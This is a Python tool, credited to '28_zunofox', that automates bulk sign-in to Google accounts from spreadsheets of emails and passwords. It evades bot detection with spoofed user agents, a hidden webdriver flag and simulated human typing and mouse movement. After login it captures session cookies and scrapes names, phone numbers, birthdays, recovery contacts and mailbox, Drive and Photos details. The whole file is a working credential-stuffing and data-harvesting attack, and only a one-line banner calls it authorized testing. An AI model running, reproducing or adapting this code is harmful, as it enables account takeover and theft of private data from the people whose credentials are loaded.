#tool by 28_zunofox
import pandas as pd
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import random
import json
import logging
import sys
import os
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import hashlib
import base64
from cryptography.fernet import Fernet
import secrets
import string
from fake_useragent import UserAgent
import undetected_chromedriver as uc
from openpyxl import load_workbook
from openpyxl.styles import PatternFill
import requests
from bs4 import BeautifulSoup
import re
import csv
import pickle
import tempfile
from pathlib import Path

class HumanBehaviorSimulator:
    """Advanced human behavior simulation to bypass detection systems"""
    
    def __init__(self):
        self.mouse_movements = []
        self.typing_patterns = []
        self.load_behavior_profiles()
    
    def load_behavior_profiles(self):
        """Load pre-recorded human behavior patterns"""
        self.mouse_movements = [
            self.smooth_mouse_move,
            self.human_click_pattern,
            self.random_mouse_drift
        ]
        self.typing_patterns = [
            self.fast_typing_with_pauses,
            self.medium_typing_with_errors,
            self.slow_deliberate_typing
        ]
    
    def random_delay(self, min_seconds=0.5, max_seconds=3.0):
        """Random delay between actions"""
        delay = random.uniform(min_seconds, max_seconds)
        time.sleep(delay)
    
    def smooth_mouse_move(self, driver, element):
        """Simulate smooth human mouse movement to element"""
        try:
            actions = ActionChains(driver)
            location = element.location_once_scrolled_into_view
            
            # Generate curved mouse path
            start_x, start_y = 0, 0
            end_x, end_y = location['x'], location['y']
            
            # Create intermediate points for smooth movement
            points = self.generate_bezier_points(start_x, start_y, end_x, end_y, 10)
            
            for point in points:
                actions.move_by_offset(point[0], point[1])
                actions.pause(random.uniform(0.01, 0.05))
            
            actions.click()
            actions.perform()
            
        except Exception as e:
            # Fallback to direct click
            element.click()
    
    def generate_bezier_points(self, start_x, start_y, end_x, end_y, num_points):
        """Generate Bezier curve points for mouse movement"""
        points = []
        
        # Control points for natural curve
        control1_x = start_x + (end_x - start_x) * 0.3
        control1_y = start_y + (end_y - start_y) * 0.7
        control2_x = start_x + (end_x - start_x) * 0.7
        control2_y = start_y + (end_y - start_y) * 0.3
        
        for i in range(num_points):
            t = i / (num_points - 1)
            # Cubic Bezier formula
            x = (1-t)**3 * start_x + 3*(1-t)**2*t*control1_x + 3*(1-t)*t**2*control2_x + t**3*end_x
            y = (1-t)**3 * start_y + 3*(1-t)**2*t*control1_y + 3*(1-t)*t**2*control2_y + t**3*end_y
            
            points.append((x - (points[-1][0] if points else 0), 
                          y - (points[-1][1] if points else 0)))
        
        return points
    
    def human_typing(self, element, text):
        """Simulate human typing with variations"""
        typing_pattern = random.choice(self.typing_patterns)
        typing_pattern(element, text)
    
    def fast_typing_with_pauses(self, element, text):
        """Fast typing pattern with natural pauses"""
        words = text.split(' ') if ' ' in text else [text]
        
        for i, word in enumerate(words):
            # Type word character by character
            for char in word:
                element.send_keys(char)
                # Random slight delay between characters
                time.sleep(random.uniform(0.05, 0.15))
            
            # Add space if not last word
            if i < len(words) - 1:
                element.send_keys(' ')
                # Longer pause between words
                time.sleep(random.uniform(0.1, 0.3))
    
    def medium_typing_with_errors(self, element, text):
        """Medium speed typing with occasional errors and corrections"""
        for char in text:
            element.send_keys(char)
            
            # Occasionally make typing error
            if random.random() < 0.02:  # 2% chance of error
                wrong_char = random.choice(string.ascii_letters)
                element.send_keys(wrong_char)
                time.sleep(random.uniform(0.2, 0.5))
                element.send_keys('\b')  # Backspace
                time.sleep(random.uniform(0.1, 0.3))
                element.send_keys(char)
            
            time.sleep(random.uniform(0.08, 0.25))
    
    def slow_deliberate_typing(self, element, text):
        """Slow, careful typing pattern"""
        for char in text:
            element.send_keys(char)
            # Longer delays for slow typing
            time.sleep(random.uniform(0.2, 0.4))

class ExcelDataHandler:
    """Advanced Excel file handler for account data management"""
    
    def __init__(self, file_path):
        self.file_path = file_path
        self.accounts = []
        self.results = []
    
    def load_accounts(self) -> List[Dict]:
        """Load accounts from Excel file with multiple format support"""
        try:
            # Try different Excel reading methods
            try:
                df = pd.read_excel(self.file_path, engine='openpyxl')
            except:
                df = pd.read_excel(self.file_path, engine='xlrd')
            
            # Normalize column names
            df.columns = df.columns.str.lower().str.strip()
            
            # Map common column name variations
            column_mapping = {
                'email': ['email', 'e-mail', 'username', 'user', 'account'],
                'password': ['password', 'pass', 'pwd', 'secret'],
                'recovery_email': ['recovery_email', 'recovery', 'backup_email', 'recovery email'],
                'phone': ['phone', 'phone_number', 'mobile', 'telephone', 'phone number']
            }
            
            # Find actual column names
            actual_columns = {}
            for standard_name, variations in column_mapping.items():
                for col in df.columns:
                    if col in variations:
                        actual_columns[standard_name] = col
                        break
            
            # Extract accounts
            for _, row in df.iterrows():
                account = {
                    'email': row.get(actual_columns.get('email', '')),
                    'password': row.get(actual_columns.get('password', '')),
                    'recovery_email': row.get(actual_columns.get('recovery_email', '')),
                    'phone': row.get(actual_columns.get('phone', '')),
                    'status': 'pending',
                    'login_time': None,
                    'error': None,
                    'extracted_data': {}
                }
                
                if account['email'] and account['password']:
                    self.accounts.append(account)
            
            logging.info(f"Loaded {len(self.accounts)} accounts from {self.file_path}")
            return self.accounts
            
        except Exception as e:
            logging.error(f"Error loading Excel file: {str(e)}")
            return []
    
    def save_results(self, output_file=None):
        """Save results to Excel file with formatting"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"google_account_results_{timestamp}.xlsx"
        
        try:
            # Create results dataframe
            results_data = []
            for account in self.accounts:
                row = {
                    'Email': account['email'],
                    'Password': account['password'],
                    'Status': account['status'],
                    'Login_Time': account['login_time'],
                    'Error': account['error'],
                    'Recovery_Email': account.get('recovery_email', ''),
                    'Phone': account.get('phone', ''),
                    'Extracted_Data_Count': len(account.get('extracted_data', {}))
                }
                # Add extracted data fields
                for key, value in account.get('extracted_data', {}).items():
                    row[f'Data_{key}'] = str(value)[:100]  # Truncate long values
                
                results_data.append(row)
            
            df = pd.DataFrame(results_data)
            
            # Create Excel writer with formatting
            with pd.ExcelWriter(output_file, engine='openpyxl') as writer:
                df.to_excel(writer, sheet_name='Results', index=False)
                
                # Get workbook and worksheet
                workbook = writer.book
                worksheet = writer.sheets['Results']
                
                # Apply formatting
                self._apply_excel_formatting(worksheet, df)
            
            logging.info(f"Results saved to {output_file}")
            return output_file
            
        except Exception as e:
            logging.error(f"Error saving results: {str(e)}")
            return None
    
    def _apply_excel_formatting(self, worksheet, df):
        """Apply conditional formatting to Excel results"""
        # Define status colors
        status_colors = {
            'success': 'FFC6EFCE',  # Light green
            'failed': 'FFFFC7CE',    # Light red
            'pending': 'FFFFEB9C',   # Light yellow
            '2fa_required': 'FFBDD7EE'  # Light blue
        }
        
        # Apply formatting based on status
        for row_idx, row in enumerate(worksheet.iter_rows(min_row=2, max_row=len(df)+1, min_col=1, max_col=len(df.columns)), 1):
            status_cell = worksheet.cell(row=row_idx+1, column=3)  # Status column
            
            if status_cell.value in status_colors:
                fill = PatternFill(start_color=status_colors[status_cell.value],
                                 end_color=status_colors[status_cell.value],
                                 fill_type="solid")
                
                for cell in row:
                    cell.fill = fill

class GoogleAccountAutomation:
    """Main class for Google account automation"""
    
    def __init__(self, excel_file_path, headless=False):
        self.excel_handler = ExcelDataHandler(excel_file_path)
        self.human_simulator = HumanBehaviorSimulator()
        self.headless = headless
        self.driver = None
        self.setup_logging()
        
        # Statistics
        self.stats = {
            'total_accounts': 0,
            'successful_logins': 0,
            'failed_logins': 0,
            'two_factor_required': 0,
            'start_time': None,
            'end_time': None
        }
    
    def setup_logging(self):
        """Setup comprehensive logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('google_automation.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
    
    def setup_driver(self):
        """Setup undetectable Chrome driver with advanced options"""
        try:
            chrome_options = uc.ChromeOptions()
            
            # Anti-detection configurations
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_argument("--disable-features=VizDisplayCompositor")
            chrome_options.add_argument("--disable-background-timer-throttling")
            chrome_options.add_argument("--disable-backgrounding-occluded-windows")
            chrome_options.add_argument("--disable-renderer-backgrounding")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-plugins")
            chrome_options.add_argument("--disable-translate")
            
            # Random user agent
            ua = UserAgent()
            user_agent = ua.random
            chrome_options.add_argument(f'--user-agent={user_agent}')
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            # Additional experimental options
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = uc.Chrome(options=chrome_options)
            
            # Execute anti-detection scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
            
            logging.info("Chrome driver setup completed with anti-detection measures")
            
        except Exception as e:
            logging.error(f"Failed to setup driver: {str(e)}")
            raise
    
    def login_to_google(self, email: str, password: str) -> Dict:
        """Advanced Google login with multiple fallback strategies"""
        login_result = {
            'success': False,
            'requires_2fa': False,
            'error': None,
            'session_cookies': None
        }
        
        try:
            # Navigate to Google login
            self.driver.get("https://accounts.google.com")
            self.human_simulator.random_delay(2, 4)
            
            # Strategy 1: Standard login flow
            if self._attempt_standard_login(email, password):
                login_result['success'] = True
                login_result['session_cookies'] = self.driver.get_cookies()
                return login_result
            
            # Strategy 2: Alternative login page
            self.driver.get("https://gmail.com")
            self.human_simulator.random_delay(2, 4)
            
            if self._attempt_gmail_login(email, password):
                login_result['success'] = True
                login_result['session_cookies'] = self.driver.get_cookies()
                return login_result
            
            # Strategy 3: Direct service login
            if self._attempt_service_login(email, password):
                login_result['success'] = True
                login_result['session_cookies'] = self.driver.get_cookies()
                return login_result
            
            login_result['error'] = "All login strategies failed"
            
        except Exception as e:
            login_result['error'] = f"Login exception: {str(e)}"
            logging.error(f"Login failed for {email}: {str(e)}")
        
        return login_result
    
    def _attempt_standard_login(self, email: str, password: str) -> bool:
        """Attempt standard Google accounts login"""
        try:
            # Wait for email field and enter email
            email_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "identifierId"))
            )
            
            self.human_simulator.human_typing(email_field, email)
            self.human_simulator.random_delay(1, 2)
            
            # Click next button
            next_button = self.driver.find_element(By.ID, "identifierNext")
            self.human_simulator.smooth_mouse_move(self.driver, next_button)
            self.human_simulator.random_delay(2, 4)
            
            # Wait for password field
            password_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )
            
            self.human_simulator.human_typing(password_field, password)
            self.human_simulator.random_delay(1, 2)
            
            # Click next button for password
            password_next = self.driver.find_element(By.ID, "passwordNext")
            self.human_simulator.smooth_mouse_move(self.driver, password_next)
            self.human_simulator.random_delay(3, 6)
            
            # Check if login was successful
            if self._is_login_successful():
                logging.info(f"Standard login successful for {email}")
                return True
            
            # Check for 2FA
            if self._check_two_factor_prompt():
                logging.info(f"2FA required for {email}")
                return False
            
        except Exception as e:
            logging.warning(f"Standard login failed: {str(e)}")
        
        return False
    
    def _attempt_gmail_login(self, email: str, password: str) -> bool:
        """Attempt login through Gmail"""
        try:
            # Look for Gmail login elements
            email_selectors = [
                "input[type='email']",
                "#identifierId",
                "input[name='identifier']",
                "#email"
            ]
            
            email_field = None
            for selector in email_selectors:
                try:
                    email_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except NoSuchElementException:
                    continue
            
            if email_field:
                self.human_simulator.human_typing(email_field, email)
                self.human_simulator.random_delay(1, 2)
                
                # Find and click next button
                next_buttons = self.driver.find_elements(By.CSS_SELECTOR, "button, input[type='submit']")
                for button in next_buttons:
                    if button.text.lower() in ['next', 'continue', 'submit']:
                        self.human_simulator.smooth_mouse_move(self.driver, button)
                        break
                
                self.human_simulator.random_delay(2, 4)
                
                # Password field
                password_selectors = [
                    "input[type='password']",
                    "input[name='password']",
                    "#password"
                ]
                
                for selector in password_selectors:
                    try:
                        password_field = WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        self.human_simulator.human_typing(password_field, password)
                        self.human_simulator.random_delay(1, 2)
                        
                        # Submit password
                        submit_buttons = self.driver.find_elements(By.CSS_SELECTOR, "button, input[type='submit']")
                        for button in submit_buttons:
                            if button.text.lower() in ['sign in', 'login', 'submit', 'next']:
                                self.human_simulator.smooth_mouse_move(self.driver, button)
                                break
                        
                        self.human_simulator.random_delay(3, 6)
                        
                        if self._is_login_successful():
                            logging.info(f"Gmail login successful for {email}")
                            return True
                            
                    except TimeoutException:
                        continue
            
        except Exception as e:
            logging.warning(f"Gmail login failed: {str(e)}")
        
        return False
    
    def _attempt_service_login(self, email: str, password: str) -> bool:
        """Attempt login through Google services"""
        services = [
            "https://drive.google.com",
            "https://photos.google.com",
            "https://calendar.google.com"
        ]
        
        for service in services:
            try:
                self.driver.get(service)
                self.human_simulator.random_delay(2, 4)
                
                if self._attempt_standard_login(email, password):
                    return True
                    
            except Exception as e:
                logging.warning(f"Service login failed for {service}: {str(e)}")
                continue
        
        return False
    
    def _is_login_successful(self) -> bool:
        """Check if login was successful"""
        try:
            # Check for successful login indicators
            success_indicators = [
                "//*[contains(text(), 'Welcome')]",
                "//*[contains(text(), 'Inbox')]",
                "//*[contains(@aria-label, 'Account')]",
                "//img[contains(@src, 'googleusercontent.com')]"
            ]
            
            for indicator in success_indicators:
                try:
                    element = self.driver.find_element(By.XPATH, indicator)
                    if element.is_displayed():
                        return True
                except NoSuchElementException:
                    continue
            
            # Check current URL for success patterns
            current_url = self.driver.current_url
            success_urls = ['myaccount.google.com', 'mail.google.com', 'drive.google.com']
            
            if any(success_url in current_url for success_url in success_urls):
                return True
                
        except Exception as e:
            logging.warning(f"Login check failed: {str(e)}")
        
        return False
    
    def _check_two_factor_prompt(self) -> bool:
        """Check if two-factor authentication is required"""
        try:
            two_factor_indicators = [
                "//*[contains(text(), '2-Step Verification')]",
                "//*[contains(text(), 'two-step verification')]",
                "//*[contains(text(), 'Enter the code')]",
                "//input[contains(@name, 'totp')]"
            ]
            
            for indicator in two_factor_indicators:
                try:
                    element = self.driver.find_element(By.XPATH, indicator)
                    if element.is_displayed():
                        return True
                except NoSuchElementException:
                    continue
                    
        except Exception as e:
            logging.warning(f"2FA check failed: {str(e)}")
        
        return False
    
    def extract_account_data(self) -> Dict:
        """Extract comprehensive account data after successful login"""
        account_data = {}
        
        try:
            # Extract from Google Account page
            account_data.update(self._extract_google_account_data())
            
            # Extract from Gmail
            account_data.update(self._extract_gmail_data())
            
            # Extract from Google Drive
            account_data.update(self._extract_drive_data())
            
            # Extract from Google Photos
            account_data.update(self._extract_photos_data())
            
        except Exception as e:
            logging.error(f"Data extraction failed: {str(e)}")
        
        return account_data
    
    def _extract_google_account_data(self) -> Dict:
        """Extract data from Google Account settings"""
        data = {}
        
        try:
            self.driver.get("https://myaccount.google.com")
            self.human_simulator.random_delay(3, 5)
            
            # Extract personal info
            personal_info_selectors = {
                'name': "//*[contains(text(), 'Name')]/following-sibling::*",
                'email': "//*[contains(text(), 'Email')]/following-sibling::*",
                'phone': "//*[contains(text(), 'Phone')]/following-sibling::*",
                'birthday': "//*[contains(text(), 'Birthday')]/following-sibling::*"
            }
            
            for key, selector in personal_info_selectors.items():
                try:
                    element = self.driver.find_element(By.XPATH, selector)
                    data[key] = element.text.strip()
                except NoSuchElementException:
                    data[key] = "Not found"
            
            # Extract security info
            security_data = self._extract_security_info()
            data.update(security_data)
            
        except Exception as e:
            logging.warning(f"Google Account data extraction failed: {str(e)}")
        
        return data
    
    def _extract_security_info(self) -> Dict:
        """Extract security and recovery information"""
        security_data = {}
        
        try:
            self.driver.get("https://myaccount.google.com/security")
            self.human_simulator.random_delay(3, 5)
            
            # Check 2FA status
            try:
                two_factor_element = self.driver.find_element(By.XPATH, "//*[contains(text(), '2-Step Verification')]")
                security_data['two_factor_enabled'] = "On" in two_factor_element.text
            except NoSuchElementException:
                security_data['two_factor_enabled'] = False
            
            # Check recovery options
            recovery_selectors = {
                'recovery_email': "//*[contains(text(), 'Recovery email')]/following-sibling::*",
                'recovery_phone': "//*[contains(text(), 'Recovery phone')]/following-sibling::*"
            }
            
            for key, selector in recovery_selectors.items():
                try:
                    element = self.driver.find_element(By.XPATH, selector)
                    security_data[key] = element.text.strip()
                except NoSuchElementException:
                    security_data[key] = "Not set"
            
        except Exception as e:
            logging.warning(f"Security info extraction failed: {str(e)}")
        
        return security_data
    
    def _extract_gmail_data(self) -> Dict:
        """Extract Gmail account data"""
        gmail_data = {}
        
        try:
            self.driver.get("https://mail.google.com")
            self.human_simulator.random_delay(4, 6)
            
            # Get email count from inbox
            try:
                email_count_element = self.driver.find_element(By.XPATH, "//div[contains(@role, 'main')]//tr")
                email_count = len(self.driver.find_elements(By.XPATH, "//div[contains(@role, 'main')]//tr"))
                gmail_data['inbox_email_count'] = email_count
            except NoSuchElementException:
                gmail_data['inbox_email_count'] = 0
            
            # Check for unread emails
            try:
                unread_emails = self.driver.find_elements(By.XPATH, "//tr[contains(@class, 'zE')]")
                gmail_data['unread_emails'] = len(unread_emails)
            except NoSuchElementException:
                gmail_data['unread_emails'] = 0
            
        except Exception as e:
            logging.warning(f"Gmail data extraction failed: {str(e)}")
        
        return gmail_data
    
    def _extract_drive_data(self) -> Dict:
        """Extract Google Drive data"""
        drive_data = {}
        
        try:
            self.driver.get("https://drive.google.com")
            self.human_simulator.random_delay(4, 6)
            
            # Get storage information
            try:
                storage_element = self.driver.find_element(By.XPATH, "//div[contains(text(), 'GB')]")
                drive_data['storage_info'] = storage_element.text
            except NoSuchElementException:
                drive_data['storage_info'] = "Not found"
            
            # Count files (approximate)
            try:
                file_elements = self.driver.find_elements(By.XPATH, "//div[contains(@data-target, 'file')]")
                drive_data['file_count'] = len(file_elements)
            except NoSuchElementException:
                drive_data['file_count'] = 0
            
        except Exception as e:
            logging.warning(f"Drive data extraction failed: {str(e)}")
        
        return drive_data
    
    def _extract_photos_data(self) -> Dict:
        """Extract Google Photos data"""
        photos_data = {}
        
        try:
            self.driver.get("https://photos.google.com")
            self.human_simulator.random_delay(4, 6)
            
            # Get photo count (approximate)
            try:
                photo_elements = self.driver.find_elements(By.XPATH, "//div[contains(@role, 'grid')]//img")
                photos_data['photo_count'] = len(photo_elements)
            except NoSuchElementException:
                photos_data['photo_count'] = 0
            
        except Exception as e:
            logging.warning(f"Photos data extraction failed: {str(e)}")
        
        return photos_data
    
    def process_all_accounts(self):
        """Process all accounts from Excel file"""
        accounts = self.excel_handler.load_accounts()
        self.stats['total_accounts'] = len(accounts)
        self.stats['start_time'] = datetime.now()
        
        logging.info(f"Starting processing of {len(accounts)} accounts")
        
        for i, account in enumerate(accounts):
            logging.info(f"Processing account {i+1}/{len(accounts)}: {account['email']}")
            
            try:
                # Setup driver for each account (fresh session)
                self.setup_driver()
                
                # Attempt login
                login_result = self.login_to_google(account['email'], account['password'])
                
                if login_result['success']:
                    account['status'] = 'success'
                    account['login_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.stats['successful_logins'] += 1
                    
                    # Extract account data
                    account_data = self.extract_account_data()
                    account['extracted_data'] = account_data
                    
                    logging.info(f"Successfully processed {account['email']}")
                    
                elif login_result['requires_2fa']:
                    account['status'] = '2fa_required'
                    account['error'] = 'Two-factor authentication required'
                    self.stats['two_factor_required'] += 1
                    logging.warning(f"2FA required for {account['email']}")
                    
                else:
                    account['status'] = 'failed'
                    account['error'] = login_result['error']
                    self.stats['failed_logins'] += 1
                    logging.error(f"Failed to process {account['email']}: {login_result['error']}")
                
            except Exception as e:
                account['status'] = 'failed'
                account['error'] = f"Processing error: {str(e)}"
                self.stats['failed_logins'] += 1
                logging.error(f"Error processing {account['email']}: {str(e)}")
            
            finally:
                # Close driver after each account
                if self.driver:
                    self.driver.quit()
                    self.driver = None
            
            # Random delay between accounts
            if i < len(accounts) - 1:
                delay = random.uniform(10, 30)
                logging.info(f"Waiting {delay:.2f} seconds before next account...")
                time.sleep(delay)
        
        self.stats['end_time'] = datetime.now()
        self._print_statistics()
        
        # Save results
        self.excel_handler.save_results()
    
    def _print_statistics(self):
        """Print processing statistics"""
        duration = self.stats['end_time'] - self.stats['start_time']
        
        print("\n" + "="*50)
        print("PROCESSING STATISTICS")
        print("="*50)
        print(f"Total accounts: {self.stats['total_accounts']}")
        print(f"Successful logins: {self.stats['successful_logins']}")
        print(f"Failed logins: {self.stats['failed_logins']}")
        print(f"2FA required: {self.stats['two_factor_required']}")
        print(f"Success rate: {(self.stats['successful_logins']/self.stats['total_accounts'])*100:.2f}%")
        print(f"Total duration: {duration}")
        print("="*50)

def main():
    """Main execution function"""
    print("28_ZUNOFOX-X GOOGLE ACCOUNT AUTOMATION FRAMEWORK")
    print("FOR AUTHORIZED TESTING ONLY\n")
    
    # Get input file path
    excel_file = input("Enter the path to Excel file with accounts: ").strip()
    
    if not os.path.exists(excel_file):
        print("Error: File not found!")
        return
    
    # Configuration
    headless = input("Run in headless mode? (y/n): ").lower().strip() == 'y'
    
    # Initialize and run automation
    automator = GoogleAccountAutomation(excel_file, headless=headless)
    
    try:
        automator.process_all_accounts()
        print("\nProcessing completed! Check 'google_automation.log' for details.")
        
    except KeyboardInterrupt:
        print("\nProcess interrupted by user")
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        logging.error(f"Fatal error: {str(e)}")

if __name__ == "__main__":
    main()